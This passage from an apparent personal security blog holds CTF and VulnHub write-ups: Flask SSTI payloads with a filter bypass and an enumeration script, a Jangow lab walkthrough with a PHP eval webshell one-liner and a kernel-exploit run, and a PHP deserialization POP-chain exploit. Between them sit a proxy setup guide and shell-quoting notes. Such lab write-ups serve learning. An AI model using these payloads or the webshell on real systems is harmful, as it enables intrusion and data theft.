<p>是可以显示结果的。因此猜测后台可能做了某些处理，如果返回的字符超过一定的长度，就不显示结果。通过抓包发现，是POST提交参数test。因此，编写脚本自动化测试（写的不怎么好）： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, base64, html  </span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup  </span><br><span class="line">url = <span class="string">&#x27;http://6d8599e6-3743-4264-bad5-d406f5736b3f.node4.buuoj.cn:81/decode&#x27;</span>  </span><br><span class="line">payload = <span class="string">&#x27;&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[%d]&#125;&#125;&#x27;</span>  </span><br><span class="line">results = []  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">1000</span>):  </span><br><span class="line">    text = payload % i  </span><br><span class="line">    text = base64.b64encode(text.encode(<span class="string">&#x27;utf-8&#x27;</span>))  </span><br><span class="line">    param=&#123;  </span><br><span class="line">        <span class="string">&#x27;text&#x27;</span>: text  </span><br><span class="line">    &#125;  </span><br><span class="line">    t = requests.post(url, params=param)  </span><br><span class="line">    soup = BeautifulSoup(t.content, <span class="string">&quot;lxml&quot;</span>)  </span><br><span class="line">    <span class="keyword">try</span>:  </span><br><span class="line">        res = soup.body.contents[<span class="number">3</span>].div.contents[<span class="number">2</span>].strip()[<span class="number">5</span>:]  <span class="comment"># 返回结果的字符串</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(res) &lt;= <span class="number">2</span>:  <span class="comment"># 如果长度太短，说明没有子类了（不知道有没有可能中间空了一个）</span></span><br><span class="line">            <span class="keyword">break</span>  </span><br><span class="line">        res = html.unescape(res)  </span><br><span class="line">        results.append(<span class="built_in">str</span>(i) + <span class="string">&#x27;. &#x27;</span>+ res)  </span><br><span class="line">    <span class="keyword">except</span>:  <span class="comment"># 有些可能没有返回的结果，做另外处理</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span> is error&quot;</span>)  </span><br><span class="line">        <span class="keyword">continue</span>  </span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(i) + <span class="string">&#x27;. &#x27;</span>+ res)  <span class="comment"># 可以不用这句</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;\n&#x27;</span>  </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;ress.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">    f.write(<span class="built_in">str</span>.join(results)) <span class="comment"># 写入文件</span></span><br></pre></td></tr></table></figure></p>
<p>最后查看得到的文件，从中寻找可用的子类，我才用<code>127. &lt;class 'os._wrap_close'&gt;</code></p>
<p>因此payload如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[127].__init__.__globals__[&#x27;popen&#x27;](&#x27;ls /&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p>发现被过滤了，经过测试发现，过滤了<code>os</code>, <code>popen</code>和<code>flag</code>。绕过方法比较简单<strong>字符串拼接:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[127].__init__.__globals__[&#x27;pop&#x27;+&#x27;en&#x27;](&#x27;ls /&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418225355.png" /></p>
<p>然后查看flag的payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[127].__init__.__globals__[&#x27;pop&#x27;+&#x27;en&#x27;](&#x27;cat /this_is_the_fl&#x27;+&#x27;ag.txt&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418225427.png" /></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>SSTI</tag>
        <tag>Flask</tag>
      </tags>
  </entry>
  <entry>
    <title>Jangow-01 Writeup</title>
    <url>/2022/05/15/Jangow-01%20Writeup/</url>
    <content><![CDATA[<p>该靶机整体难度不高。</p>
<span id="more"></span>
<h1 id="靶机信息">1. 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/jangow-101,754/">Jangow: 1.0.1 ~ VulnHub</a></li>
</ul>
<p>难度：</p>
<ul>
<li>中等</li>
</ul>
<p>目标：</p>
<ul>
<li>拿到root权限</li>
<li>拿到2个flag</li>
</ul>
<h1 id="信息收集">2. 信息收集</h1>
<h2 id="端口信息">2.1. 端口信息</h2>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. sudo arp-scan -l</span><br><span class="line">2. sudo nmap -p- 10.0.2.46</span><br><span class="line">3. sudo nmap -p21,80 -A 10.0.2.46</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515093442.png" /></p>
<h2 id="网页信息">2.2. 网页信息</h2>
<p>直接访问网页，发现一个目录 site，点击进入真正的页面，但是该页面没有功能点很少，当点击 Buscar 时，url 出现了变化，并且页面变白了</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515115900.png" /></p>
<p>但是还不知道这里的用途是什么。</p>
<p>对 10.0.2.46 进行路径扫描，得到一个备份文件 .backup ，其中内容如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$servername = &quot;localhost&quot;;</span><br><span class="line">$database = &quot;jangow01&quot;;</span><br><span class="line">$username = &quot;jangow01&quot;;</span><br><span class="line">$password = &quot;abygurl69&quot;;</span><br><span class="line">// Create connection</span><br><span class="line">$conn = mysqli_connect($servername, $username, $password, $database);</span><br><span class="line">// Check connection</span><br><span class="line">if (!$conn) &#123;</span><br><span class="line">    die(&quot;Connection failed: &quot; . mysqli_connect_error());</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;Connected successfully&quot;;</span><br><span class="line">mysqli_close($conn);</span><br></pre></td></tr></table></figure></p>
<h2 id="其他信息">2.3. 其他信息</h2>
<p>目前只有ftp需要登录信息，因此登录进去，在/var/www/html/site中找到了 burque.php 文件，内容如下：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515121915.png" /></p>
<p>说明可以RCE。</p>
<h1 id="反弹shell">3. 反弹shell</h1>
<h2 id="方法1">3.1. 方法1</h2>
<p>直接利用 RCE 反弹shell，这里需要注意的是端口被限制了，只允许反弹至kali的443端口</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515120618.png" /></p>
<blockquote>
<p>如果端口被做了限制，那就使用54/UDP, 80/TCP, 443/TCP。第一个是DNS默认的端口，80为http默认端口，443为https默认端口，一般都处于开放状态，且允许发送、接收数据。</p>
</blockquote>
<h2 id="方法2">3.2. 方法2</h2>
<p>我最开始没想到方法1，想着是在没办法，先利用 RCE 写入一句话： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot; &gt; reve.php</span><br><span class="line">echo &#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27; &gt; rev.php</span><br></pre></td></tr></table></figure></p>
<p>后者可以，前者不可以</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515103711.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515103725.png" /></p>
<p>然后利用蚁剑连接上去</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515120919.png" /></p>
<p>虽然最后还是利用443端口反弹shell（😀）</p>
<h1 id="权限提升">4. 权限提升</h1>
<p>我因为是先上线了蚁剑，所以我利用蚁剑来发送脚本。</p>
<p>先发送了一个 linux-exploit-suggester.sh，然后运行，得到许多可能存在的漏洞</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515121146.png" /></p>
<p>然后依次执行。现在kali上搜索</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515121209.png" /></p>
<p>然后利用蚁剑将文件传输到靶机，编译、执行 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. gcc 45010.c -o exp1</span><br><span class="line">2. chmod +x exp1</span><br><span class="line">3. ./exp1</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515121323.png" /></p>
<p>最后的收尾工作，读取两个flag <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 1. /home/jangow01/user.txt</span><br><span class="line">d41d8cd98f00b204e9800998ecf8427e</span><br><span class="line"></span><br><span class="line">// 2. /root/proof.txt</span><br><span class="line">                @@@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@@@@@@@@@@@@@@@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;                                                                                        </span><br><span class="line">                @  @@@@@@@@@@@@@@@&amp;#   #@@@@@@@@&amp;(.    /&amp;@@@@@@@@@@                                                                                        </span><br><span class="line">                @  @@@@@@@@@@&amp;( .@@@@@@@@&amp;%####((//#&amp;@@@&amp;   .&amp;@@@@@                                                                                        </span><br><span class="line">                @  @@@@@@@&amp;  @@@@@@&amp;@@@@@&amp;%######%&amp;@*   ./@@*   &amp;@@                                                                                        </span><br><span class="line">                @  @@@@@* (@@@@@@@@@#/.               .*@.  .#&amp;.   &amp;@@@&amp;&amp;                                                                                  </span><br><span class="line">                @  @@@, /@@@@@@@@#,                       .@.  ,&amp;,   @@&amp;&amp;                                                                                  </span><br><span class="line">                @  @&amp;  @@@@@@@@#.         @@@,@@@/           %.  #,   %@&amp;                                                                                  </span><br><span class="line">                @@@#  @@@@@@@@/         .@@@@@@@@@@            *  .,    @@                                                                                 </span><br><span class="line">                @@&amp;  @@@@@@@@*          @@@@@@@@@@@             ,        @                                                                                 </span><br><span class="line">                @&amp;  .@@@@@@@(      @@@@@@@@@@@@@@@@@@@@@        *.       &amp;@                                                                                </span><br><span class="line">                @@/  *@@@@@@@/           @@@@@@@@@@@#                      @@                 </span><br><span class="line">                 @@   .@@@@@@@/          @@@@@@@@@@@@@              @#      @@                 </span><br><span class="line">                @@    @@@@@@@@.          @@@@@@@@@@@              @@(      @@                 </span><br><span class="line">                @&amp;   .@@@@@@@@.         , @@@@@@@ *            .@@@*(    .@                  </span><br><span class="line">                @@    ,@@@@@@@@,   @@@@@@@@@&amp;*%@@@@@@@@@,    @@@@@(%&amp;*   &amp;@                  </span><br><span class="line">                @@&amp;     @@@@@@@@@@@@@@@@@         (@@@@@@@@@@@@@@%@@/   &amp;@                   </span><br><span class="line">                @ @&amp;     ,@@@@@@@@@@@@@@@,@@@@@@@&amp;%@@@@@@@@@@@@@@@%*   &amp;@                    </span><br><span class="line">                @  @@.     .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%*    &amp;@&amp;                    </span><br><span class="line">                @  @@@&amp;       ,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%/     &amp;@@&amp;&amp;                    </span><br><span class="line">                @  @@@@@@.        *%@@@@@@@@@@@@@@@@@@@@&amp;#/.      &amp;@@@@&amp;&amp;                    </span><br><span class="line">                @  @@@@@@@@&amp;               JANGOW               &amp;@@@                          </span><br><span class="line">                @  &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@@@&amp;     @@(&amp;@ @. %.@ @@%@     &amp;@@@&amp;&amp;&amp;&amp;                          </span><br><span class="line">                              &amp;&amp;&amp;@@@@&amp;%       &amp;/    (&amp;&amp;@@@&amp;&amp;&amp;                                </span><br><span class="line">                                (((((((((((((((((((((((((((((</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">da39a3ee5e6b4b0d3255bfef95601890afd80709</span><br></pre></td></tr></table></figure></p>
<h1 id="总结">5. 总结</h1>
<p>该靶机整体难度不高，唯一的难点在于对端口做了限制。涉及到一下攻击方法：</p>
<ol type="1">
<li>备份文件泄露</li>
<li>内核漏洞</li>
</ol>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>内核漏洞</tag>
        <tag>备份文件泄露</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux(kali)安装clash</title>
    <url>/2022/05/03/Linux(kali)%E5%AE%89%E8%A3%85clash/</url>
    <content><![CDATA[<p>个人日常问题解决的记录。</p>
<span id="more"></span>
<h1 id="基本配置">1. 基本配置</h1>
<h2 id="下载clash">1.1. 下载clash</h2>
<p>链接：<a href="https://github.com/Dreamacro/clash/releases">Releases · Dreamacro/clash · GitHub</a></p>
<p>选择对应版本的下载，最好用一个文件夹(clash)统一管理下。输入下面命令解压： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gunzip clash-linux-amd64-v1.10.0.gz</span><br></pre></td></tr></table></figure></p>
<h2 id="修改配置信息">1.2. 修改配置信息</h2>
<p>首先启动clash： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. chmod +x clash-linux-amd64-v1.10.0 <span class="comment"># 给执行权限</span></span><br><span class="line">2. ./clash-linux-amd64-v1.10.0 <span class="comment"># 执行</span></span><br></pre></td></tr></table></figure></p>
<p>第一次执行的时候会创建一个目录.config，一般都在用户家目录下（比如我是root，就会在/root/.config）</p>
<p>进入到/root/.config/clash/目录，然后执行下面命令： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget -O config.yaml [subscribe_links]</span><br></pre></td></tr></table></figure></p>
<p>subscribe_links 就是你使用机场的订阅链接。</p>
<p>然后回到clash应用所在目录，检查是否可以运行 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. <span class="built_in">cd</span> /root/clash</span><br><span class="line">2. ./clash-linux-amd64-v1.10.0 -t</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503084444.png" /></p>
<h2 id="选择代理节点">1.3. 选择代理节点</h2>
<p>运行下面命令启动Clash： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./clash-linux-amd64-v1.10.0</span><br></pre></td></tr></table></figure></p>
<p>进入图形化界面：<a href="http://clash.razord.top/#/proxies">Clash</a></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503084556.png" /></p>
<p>上面的host, port, secret的信息看config.yaml</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503084706.png" /></p>
<p>我这里并没有secret，当然可以自己添加，不过我懒。输入对应的信息之后就可以进入到界面，然后选择节点就可以了。</p>
<h1 id="浏览器配置">2. 浏览器配置</h1>
<p>打开firefox，然后preferences或者settings</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503085009.png" /></p>
<p>然后搜索proxy</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503085027.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503085105.png" /></p>
<p>（如果存在ftp proxy，也需要设置成和http proxy一样）然后即可上网</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503085153.png" /></p>
<h1 id="兼容-burpsuite">3. 兼容 burpsuite</h1>
<p>将浏览器中的代理设置为如下：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503085334.png" /></p>
<p>打开burpsuite，来到User options</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503085531.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503085557.png" /></p>
<p>最后还需要向firefox导入证书，否则会出现如下提示</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503085640.png" /></p>
<ol type="1">
<li><p>burpsuite导出证书</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503085717.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503085732.png" /></p>
<p>随便选一个文件夹，后缀为.cer</p></li>
<li><p>firefox导入该证书</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503085857.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503085910.png" /></p>
<p>找到刚刚导出的证书，然后</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503085938.png" /></p></li>
<li><p>最后就可以成功利用burp抓包了</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220503090035.png" /></p></li>
</ol>
<p>有一点不好的就是每次不用burp的时候都需要把firefox代理设置改回去。</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>clash</tag>
        <tag>burpsuite</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux的shell中单、双引号的区别</title>
    <url>/2022/05/15/Linux%E7%9A%84shell%E4%B8%AD%E5%8D%95%E3%80%81%E5%8F%8C%E5%BC%95%E5%8F%B7%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
    <content><![CDATA[<p>个人的知识记录。</p>
<span id="more"></span>
<h1 id="经典解释">1. 经典解释</h1>
<ol type="1">
<li><strong>单引号</strong>：所见即所得</li>
<li><strong>双引号</strong>：所见非所得，会先将变量解析，再输出</li>
<li><strong>反引号</strong>：可用于执行命令，[[远程命令、代码执行总结（PHP）#2 5 反引号]]</li>
<li><strong>转义字符<code>\</code></strong>：Linux如果需要让转义字符发生作用，外面需要使用双引号！</li>
</ol>
<h1 id="区别">2. 区别</h1>
<p>以下面的命令为例： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &#x27;$PATH&#x27;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515200423.png" /></p>
<p>而如果使用双引号 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;$PATH&quot;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515200450.png" /></p>
<p>可以看到，如果使用单引号，只是将单引号中的内容当作普通的字符而输出；而使用双引号，则会先将双引号中的变量解析，然后将解析之后的结果代替原先变量的位置，然后将内容输出，具体看下面的例子： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;PATH is : $PATH&quot;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515200657.png" /></p>
<p>如果需要使用转义字符。使用单引号： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &#x27;\$PATH&#x27;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515201020.png" /></p>
<p>使用双引号： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;\$PATH&quot;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515201051.png" /></p>
<p>此时，两者的结果一致，这是因为双引号使得转义字符的作用生效，将 $ 转义，使其不作为变量的一部分。</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux基础</tag>
      </tags>
  </entry>
  <entry>
    <title>MRCTF2020 Ezpop</title>
    <url>/2022/04/15/MRCTF2020%20Ezpop/</url>
    <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5BMRCTF2020%5DEzpop">Ezpop</a></p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>进入环境，直接得到如下源码： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123; </span><br><span class="line">        <span class="variable">$function</span> = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<h1 id="解题">解题</h1>
<h2 id="寻找pop链">寻找POP链</h2>
<p>首先寻找POP链的头部，即如下代码： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br></pre></td></tr></table></figure></p>
<p>传入一个序列化后的字符串。</p>
<p>接着寻找POP链尾部，注意到<code>Modifier</code>类中的<code>__invoke()</code>魔术方法中存在这文件包含漏洞，因此可以利用<code>include(''/flag')</code>获得flag，这就是尾部。</p>
<p>然后顺着尾部往上爬。当类被当作函数执行的时候，就会自动调用<code>__invoke()</code>魔术方法。而能够把类当作函数执行的只有<code>$function();</code>。若<code>$function=new Modifier()</code>时，就会调用<code>__invoke()</code>。</p>
<p><code>$function();</code>在<code>Test</code>类中的<code>__get()</code>魔术方法中，而当读取不可访问的属性的值时，该魔术方法才会调用。此时注意到<code>Show</code>类中的<code>return $this-&gt;str-&gt;source;</code>，如果<code>$this-&gt;str=new Test()</code>，那么<code>Test</code>类对象中并不存在<code>source</code>属性，从而就会触发<code>__get()</code>魔术方法。</p>
<p>而<code>return $this-&gt;str-&gt;source;</code>被魔术方法<code>__toString()</code>调用，当类被当作字符串执行的时候，才会自动调用该魔术方法。唯一比较绕的就是这里。我们可以创建两个<code>Show</code>类的对象a,b，然后令<code>$a-&gt;source=$b</code>，该类中的<code>__wakeup()</code>魔术方法会执行<code>preg_match()</code>，这样就实现了将<code>Show</code>类当作字符串，从而触发<code>__toString()</code>魔术方法。</p>
<p>通过我们输入，传入一个<code>Show</code>类的序列化后的字符串，设置合适的属性值，即可触发整个POP链。</p>
<p>综上，POP链如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">传入Show类的序列化后的字符串-&gt;调用__toString()-&gt;调用Test类中的__get()魔术方法-&gt;调用Modifier类中的__invoke()魔术方法-&gt;调用Modifier类中的append()方法，将flag文件包含</span><br></pre></td></tr></table></figure></p>
<h2 id="payload构造">payload构造</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span> = <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Show();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> Show();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> Modifier();</span><br><span class="line"><span class="variable">$a</span>-&gt;source = <span class="variable">$b</span>;  <span class="comment"># 触发__tpString</span></span><br><span class="line"><span class="variable">$b</span>-&gt;str = <span class="variable">$c</span>;     <span class="comment"># 触发__get</span></span><br><span class="line">(<span class="variable">$b</span>-&gt;str)-&gt;p = <span class="variable">$d</span>;<span class="comment"># 触发__invoke</span></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>输入上面代码得到的字符串，其实并没有出现Flag，而是出现提示<code>Help Me Find FLAG!</code>。此时想到，可以利用伪协议配合文件包含读取文件内容。</p>
<p>因此将<code>Modifier</code>类中的<code>$var</code>属性的值替换掉： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span>  <span class="variable">$var</span> = <span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>;</span><br></pre></td></tr></table></figure></p>
<p>将获得的内容进行base64解码即可得到flag。</p>
<h1 id="总结">总结</h1>
<p>本题考察的是反序列化中的POP链。主要是将POP链从头到尾理清楚即可。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>文件包含</tag>
        <tag>PHP伪协议</tag>
        <tag>POP</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux反弹shell原理</title>
    <url>/2022/05/16/Linux%E5%8F%8D%E5%BC%B9shell%E5%8E%9F%E7%90%86/</url>
    <content><![CDATA[<p>个人的知识点记录。</p>
<span id="more"></span>
<h1 id="文件描述符">1. 文件描述符</h1>
<blockquote>
<p>Linux文件描述符：理解为Linux跟踪打开文件，并且为其分配的一个数字。该数字有点像 <code>withopen(Path, 'a') as f</code> 中的f，此时f就代表的打开的文件，可以利用f进行读写操作。</p>
</blockquote>
